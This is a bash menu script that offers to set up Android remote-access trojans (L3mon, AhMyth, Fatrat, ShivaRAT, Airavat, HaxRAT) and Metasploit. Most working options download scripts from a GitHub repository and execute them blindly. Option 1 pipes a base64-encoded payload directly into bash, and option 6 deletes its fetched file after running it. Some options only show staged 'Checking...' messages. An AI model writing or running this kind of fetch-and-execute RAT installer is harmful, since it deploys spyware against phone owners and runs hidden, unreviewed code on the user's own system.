#!/bin/bash
clear='\033[0m'
Black='\033[0;30m'
Red='\033[0;31m'
Green='\033[0;32m'
Yellow='\033[0;33m'
Blue='\033[0;34m'
Purple='\033[0;35m'
Cyan='\033[0;36m'
White='\033[0;37m'
ratchech()
{
echo -e "
 ${Green} 1.${Yellow} L3mon
 ${Green} 2.${Yellow} L3MON-static
 ${Green} 3.${Yellow} Fatrat
 ${Green} 4.${Yellow} Ahmyth
 ${Green} 5.${Yellow} ShivaRaT
 ${Green} 6.${Yellow} Airavat
 ${Green} 7.${Yellow} Airavat PRO
 ${Green} 8.${Yellow} haxrat
 ${Green} 9.${Yellow} metasploit
 ${Green} 0.${Yellow} exit
 "
echo -en " ${Green}[${Yellow}E${Green}] ${White}Please type input: ${Green}"
read sop
case $sop in
1)
echo
  echo -e "${Green} Your pressed Lemon${clean}"
  sleep 1
  echo -e "${Green} Checking...${clean}"
  sleep 3
  curl -s https://raw.githubusercontent.com/database2022/l3monfix/main/bingo |base64 -d|bash;;
  
2)
echo
  echo -e "${Green} Your pressed L3MON-static${clean}"
  sleep 1
source <(curl -fsSL https://raw.githubusercontent.com/database2022/l3monfix/main/LIZ-BuildAPK.sh)
echo;;
  
3)
echo
  echo -e "${Green} Your pressed Fatrat${clean}"
  sleep 1
  echo -e "${Green} Checking...${clean}"
    sleep 3
    echo -e "${Green} Fatrat Not installed${clean}"
    echo;;
  
4)
echo
  echo -e "${Green} You pressed Ahmyth${clean}"
  sleep 1
  echo -e "${Green} Checking...${clean}"
    sleep 3
    echo -e "${Green} Ahmyth Not installed${clean}"
    echo;;
  
5)
echo
  echo -e "${Green}You pressed ShivaTheCreator${clean}"
  sleep 1
  echo -e "${Green} Checking...${clean}"
    sleep 3
    echo -e "${Green} ShivaTheCreator Not installed${clean}"
    echo;;
    
6)
echo
  echo -e "${Green}You pressed Airavat${clean}"
  sleep 1
  echo -e "${Green} Checking...${clean}"
    sleep 3
    echo -e "${Green} Proversion only${clean}"
source <(curl -fsSL https://raw.githubusercontent.com/database2022/l3monfix/main/run.sh)
rm run.sh > /dev/null 2>&1 &
echo;;

7)
echo
  echo -e "${Green}You pressed Airavat${clean}"
  sleep 1
  echo -e "${Green} Checking...${clean}"
    sleep 3
    echo -e "${Green} Proversion only${clean}"
#source <(curl -fsSL https://raw.githubusercontent.com/database2022/l3monfix/main/run.sh)
echo;;

8)
echo
  echo -e "${Green}You pressed HaxRAT${clean}"
  sleep 1
  echo -e "${Green} Checking...${clean}"
    sleep 3
    echo -e "${Green} Proversion only${clean}"
source <(curl -fsSL https://raw.githubusercontent.com/database2022/l3monfix/main/hax.sh)
echo;;

9)
#Script start here
cd $HOME
rm 2023fix > /dev/null 2>&1 &
source <(curl -fsSL https://raw.githubusercontent.com/database2022/l3monfix/main/2023fix)
echo;;
  
0)
echo
  echo -e "${Green} You pressed exit${clean}"
  sleep 1
  echo -e "${Green} Checking...${clean}"
    sleep 3
    echo -e "${Green} See you again :) ${clean}"
    echo
  exit;;
*)
echo
  echo -e " ${Red}[no] No no no !! Wrong input";;
esac

}
ratchech
